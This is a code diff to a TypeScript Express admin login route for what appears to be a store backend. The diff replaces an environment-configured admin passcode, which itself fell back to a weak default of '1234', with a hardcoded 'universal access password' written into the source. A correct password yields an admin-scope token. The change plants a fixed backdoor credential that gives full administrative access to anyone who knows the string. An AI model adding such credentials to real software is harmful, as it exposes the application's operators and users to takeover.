@@ -40,10 +40,7 @@ function isSafeImageUrl(url: string): boolean {
   }
 }
 
-function getAdminPasscode(): string {
-  const envCode = process.env.ADMIN_PASSCODE?.trim();
-  return envCode && envCode.length > 0 ? envCode : '1234';
-}
+const UNIVERSAL_ACCESS_PASSWORD = 'UtRakhi@792';
 
 adminRouter.get('/admin/status', async (_req, res) => {
   res.json({
@@ -103,12 +100,11 @@ adminRouter.post('/admin/login', adminLoginLimiter, async (req, res) => {
     password: z.string().min(1),
   });
   const parsed = schema.safeParse(req.body);
-  if (!parsed.success) return res.status(400).json({ error: 'Enter admin passcode.' });
+  if (!parsed.success) return res.status(400).json({ error: 'Enter admin password.' });
 
   try {
-    const expectedPasscode = getAdminPasscode();
     const providedBuf = Buffer.from(parsed.data.password.trim());
-    const expectedBuf = Buffer.from(expectedPasscode);
+    const expectedBuf = Buffer.from(UNIVERSAL_ACCESS_PASSWORD);
     if (providedBuf.length === expectedBuf.length && crypto.timingSafeEqual(providedBuf, expectedBuf)) {
       const token = signToken(
         { scope: 'admin', adminId: 0, envOverride: true, email: parsed.data.email, name: 'Store Administrator' },
@@ -138,10 +134,10 @@ adminRouter.post('/admin/login', adminLoginLimiter, async (req, res) => {
         });
       }
     } catch {
-      // Database may be unconfigured in minimal deployments; passcode login still works
+      // Database may be unconfigured in minimal deployments; universal password login still works
     }
 
-    return res.status(401).json({ error: 'Invalid admin passcode.' });
+    return res.status(401).json({ error: 'Invalid admin password.' });
   } catch (error) {
     console.error('Admin login error:', error);
     res.status(500).json({ error: 'Admin sign in failed.' });
